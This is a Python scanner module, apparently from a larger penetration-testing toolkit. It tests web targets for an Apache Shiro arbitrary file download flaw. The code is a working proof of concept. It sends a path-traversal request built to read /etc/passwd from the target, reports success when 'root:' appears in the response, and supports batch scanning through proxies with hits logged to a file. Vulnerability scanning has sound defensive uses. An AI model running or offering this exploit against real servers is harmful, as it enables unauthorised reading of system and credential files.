#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from libs.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from libs.reqset import ReqSet
from rich.prompt import Prompt
from libs.output import OutPutFile
urllib3.disable_warnings()
class Shiro_File_Dump_Scan:
    def poc(self,input_url):
        try:
            url = input_url + "/images;/../backup/download?fileName=../../../../../../../../etc/passwd"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            if req.status_code == 200 and "root:" in req.text:
                if not self.batch:
                    OutPrintInfoSuc("Shiro", '目标存在Shiro任意文件下载漏洞')
                    OutPrintInfo("Shiro", url)
                else:
                    OutPrintInfoSuc("Shiro", f'目标存在Shiro任意文件下载漏洞: {url}')
                    OutPutFile("shiro_file_dump.txt",f'目标存在Shiro任意文件下载漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("Shiro", f'目标不存在Shiro任意文件下载漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Shiro",'目标请求出错')
            return False
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        if not self.batch:
            req = ReqSet(header=header, proxy=proxy)
            self.proxy = req["proxy"]
            self.headers = req["header"]
        else:
            self.proxy = {"http": proxy, "https": proxy}
            req = ReqSet(header=header)
            self.headers = req["header"]
        if not self.batch:
            OutPrintInfo("Shiro", '开始检测Shiro任意文件下载漏洞...')

        self.poc(url)


        if not self.batch:
            OutPrintInfo("Shiro", 'Shiro任意文件下载漏洞检测结束')

